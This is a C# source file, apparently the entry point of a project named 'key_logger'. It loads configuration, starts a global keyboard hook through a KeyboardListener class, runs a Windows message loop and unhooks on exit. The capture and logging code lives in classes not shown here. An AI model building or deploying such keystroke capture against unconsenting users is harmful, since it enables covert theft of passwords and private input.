using key_logger.Services;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace key_logger
{
    class key_logger
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void Main()
        {
            var cfg = new ConfigurationService().Load();
            var logService = new LogService(cfg);

            var listener = new KeyboardListener(logService);
            listener.Listen();

            ShowWindow(GetConsoleWindow(), 1);

            Application.Run();

            listener.UnhookWindowsHook();
        }
    }
}
